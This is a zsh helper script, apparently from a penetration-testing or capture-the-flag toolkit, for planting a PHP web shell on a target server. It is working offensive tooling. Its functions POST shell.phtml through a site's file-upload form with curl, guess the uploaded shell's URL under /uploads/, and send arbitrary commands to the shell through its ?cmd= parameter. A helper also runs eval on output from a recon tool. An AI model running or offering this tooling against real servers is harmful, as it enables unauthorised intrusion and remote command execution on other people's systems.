# ========================
# web shell upload helpers
# ========================

: "${SHELL_UPLOAD_FILE:=/workspace/payloads/webshells/shell.phtml}"

_upsh_from_exec() {
  local exec_id="$1"
  local app="${RECON_APP:-/opt/recon/recon.py}"
  local out

  if ! out=$(python3 "$app" exec-form "$exec_id" --shell 2>&1); then
    echo "$out" >&2
    return 1
  fi

  eval "$out"
  echo "[+] form from exec_id=$exec_id → url=$_UPSH_URL field=$_UPSH_FIELD extra=${_UPSH_EXTRA[*]:-}"
}

upload-shell() {
  local url=""
  local field="file"
  local remote=""
  local file="$SHELL_UPLOAD_FILE"
  local verbose=""
  local extra_set=false
  local -a extra=()

  # upsh 63 / upsh @63 — load form from recon execution (ev で見た curl の HTML)
  if [[ "${1:-}" =~ '^@?([0-9]+)$' ]]; then
    _upsh_from_exec "${match[1]}" || return 1
    [[ -n "${_UPSH_URL:-}" ]] && url="$_UPSH_URL"
    [[ -n "${_UPSH_FIELD:-}" ]] && field="$_UPSH_FIELD"
    if [[ ${#_UPSH_EXTRA[@]} -gt 0 ]]; then
      extra=("${_UPSH_EXTRA[@]}")
      extra_set=true
    fi
    unset _UPSH_URL _UPSH_FIELD _UPSH_EXTRA
    shift
  fi

  while [[ $# -gt 0 ]]; do
    case "$1" in
      -h|--help)
        echo "usage: upload-shell [options] [<exec_id>|]<form_url>"
        echo "  POST multipart upload of shell.phtml (default: $SHELL_UPLOAD_FILE)"
        echo ""
        echo "options:"
        echo "  <exec_id>              load form from ev/exec (e.g. upsh 63)"
        echo "  @<exec_id>             same as above"
        echo "  -f, --field <name>     form field for file (overrides exec-form)"
        echo "  -n, --name <filename>  filename sent to server"
        echo "  -p, --path <path>      local file to upload"
        echo "  -F <key=value>         extra form field (overrides exec-form extras)"
        echo "  -v, --verbose          curl -v"
        echo ""
        echo "examples:"
        echo "  x curl -sS http://\$IP/panel/     # then:"
        echo "  upsh 63                            # form fields from exec HTML"
        echo "  upsh -f fileUpload -F submit=Upload http://\$IP/panel/"
        echo ""
        echo "  exec-form 63                       # preview parsed fields"
        return 0
        ;;
      -f|--field)
        field="$2"
        shift 2
        ;;
      -n|--name)
        remote="$2"
        shift 2
        ;;
      -p|--path)
        file="$2"
        shift 2
        ;;
      -F)
        if ! $extra_set; then
          extra=()
          extra_set=true
        fi
        extra+=("$2")
        shift 2
        ;;
      -v|--verbose)
        verbose="-v"
        shift
        ;;
      *)
        url="$1"
        shift
        ;;
    esac
  done

  if [[ -z "$url" ]]; then
    echo "usage: upload-shell [options] [<exec_id>|]<form_url>"
    return 1
  fi

  if [[ ! -f "$file" ]]; then
    echo "[-] file not found: $file"
    return 1
  fi

  [[ -z "$remote" ]] && remote="${file:t}"

  local -a curl_args=(-sS $verbose)
  curl_args+=(-F "${field}=@${file};filename=${remote}")
  local item
  for item in "${extra[@]}"; do
    curl_args+=(-F "$item")
  done
  curl_args+=("$url")

  echo "[*] POST $url"
  echo "[*] field=${field} filename=${remote} file=${file}"
  [[ ${#extra[@]} -gt 0 ]] && echo "[*] extra: ${extra[*]}"
  curl "${curl_args[@]}"
  echo ""
  shell-url "/uploads/${remote}"
}

# print likely shell URL after upload
shell-url() {
  local path="${1:-/uploads/shell.phtml}"
  local base="${IP:+http://${IP}}"

  if [[ -z "$base" ]]; then
    echo "[-] target-set <ip> or pass full URL to shell-cmd"
    echo "    path hint: $path"
    return 1
  fi

  [[ "$path" != /* ]] && path="/$path"
  echo "${base}${path}"
}

# run command via uploaded ?cmd= web shell
shell-cmd() {
  local url="$1"
  local cmd="${2:-id}"

  if [[ -z "$url" ]]; then
    echo "usage: shell-cmd <shell_url> [command]"
    echo "  example: shell-cmd \$(shell-url) whoami"
    return 1
  fi

  local enc
  enc=$(python3 -c 'import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))' "$cmd")

  curl -sS "${url}?cmd=${enc}"
  echo ""
}

upsh() {
  upload-shell "$@"
}

exec-form() {
  python3 "${RECON_APP:-/opt/recon/recon.py}" exec-form "$@"
}

_upload-shell() {
  _arguments \
    '-f[form field name]:field name:' \
    '-n[remote filename]:filename:' \
    '-p[local path]:file:_files' \
    '-F[extra field]:key=value:' \
    '-v[verbose]' \
    '1:form url or exec id:()'
}

compdef _upload-shell upload-shell upsh
